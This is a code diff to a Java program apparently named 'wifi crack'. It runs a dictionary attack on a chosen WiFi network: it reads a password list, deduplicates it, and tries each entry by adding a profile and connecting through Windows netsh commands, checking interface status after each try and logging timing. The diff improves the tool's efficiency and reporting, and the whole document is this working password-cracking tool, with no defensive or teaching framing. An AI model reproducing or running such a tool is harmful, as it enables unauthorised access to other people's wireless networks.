@@ -2,13 +2,16 @@ package com.znkeji.zn_wifi_carck;
 
 import com.znkeji.zn_wifi_carck.utils.CmdUtils;
 import com.znkeji.zn_wifi_carck.utils.StringUtils;
+import com.znkeji.zn_wifi_carck.utils.TimeUtil;
 import com.znkeji.zn_wifi_carck.utils.WiFiUtils;
 import org.springframework.util.FileCopyUtils;
 
-import java.io.*;
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Scanner;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileReader;
+import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.*;
 
 /**
  * Created with IntelliJ IDEA.
@@ -31,28 +34,40 @@ public class App {
 
         Scanner sca =new Scanner(System.in);
         sca.useDelimiter("\n");
-        String ssid = sca.next();
+        String ssid = ssidList.get(Integer.valueOf(sca.next()) - 1);
 
         System.out.println("-----------您选择的wifi为【"+ssid+"】-------------");
         System.out.println("-----------开始破解-------------");
 
+        //密码字典
         String path = App.class.getClassLoader().getResource("pwd.txt").getPath();
         BufferedReader reader = new BufferedReader(new FileReader(path));
 
 
         String pwd = null;
-        int i = 0;
+        Set<String> pwdSet = new HashSet<>();
         while((pwd = reader.readLine()) != null){
+            pwdSet.add(pwd);
+        }
 
-            i++;
-
-            System.out.println("开始连接："+i+" -->"+ssid+" - "+pwd);
+        List<String> pwdList = new ArrayList<>(pwdSet);
+        long startTime = System.currentTimeMillis();
+        System.out.println(String.format("Start at: %s", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(startTime))));
+        for (int i = 0; i < pwdList.size(); i++) {
+            pwd = pwdList.get(i);
+            System.out.println("开始连接："+i+" -->"+ssid+" - "+ pwd);
             boolean success = connect(ssid, pwd);
             if(success){
-                System.out.println("连接成功，"+ssid+"的密码为"+pwd);
+                System.out.println("连接成功，"+ssid+"的密码为"+ pwd);
+                System.out.println(TimeUtil.TimeDiff("共消耗", startTime));
                 return;
             }
+            System.out.println(TimeUtil.TimeDiff("已消耗", startTime));
+            System.out.println(String.format("平均每条耗时:%s ms", (System.currentTimeMillis() - startTime) / Long.valueOf(i + 1)));
         }
+
+        System.out.println("连接失败，没有找到密码");
+        System.out.println(TimeUtil.TimeDiff("共消耗", startTime));
 
     }
 
@@ -72,10 +87,11 @@ public class App {
             printList(CmdUtils.execute("netsh wlan add profile filename=temp.xml","./"));;
             //连接wifi
             printList(CmdUtils.execute("netsh wlan connect name=\""+ssid+"\"","./"));;
-            //测试网络，使用ping的方式检测网络，此处建议优化改其他效率更高的方式，暂停2000毫秒是因为连接WiFi需要时间，这个时间因环境而异
+            //测试网络，暂停2000毫秒是因为连接WiFi需要时间，这个时间因环境而异
+            //改为直接获取wlan接口状态-netsh wlan show interface
             CmdUtils.execute("ipconfig","./");
             Thread.sleep(2000);
-            boolean success = ping();
+            boolean success = connected();
             return success;
 
         }catch (Exception e){
@@ -112,16 +128,15 @@ public class App {
     }
 
     /**
-     * ping 校验
+     * 已连接 校验
      */
-    private static boolean ping() {
+    private static boolean connected() {
         boolean pinged = false;
-        String cmd = "ping www.baidu.com";
+        String cmd = "netsh wlan show interface";
         List<String> result = CmdUtils.execute(cmd, "./");
-//        printList(result);
         if (result != null && result.size() > 0) {
             for (String item : result) {
-                if (item.contains("来自")) {
+                if (item.contains("已连接")) {
                     pinged = true;
                     break;
                 }
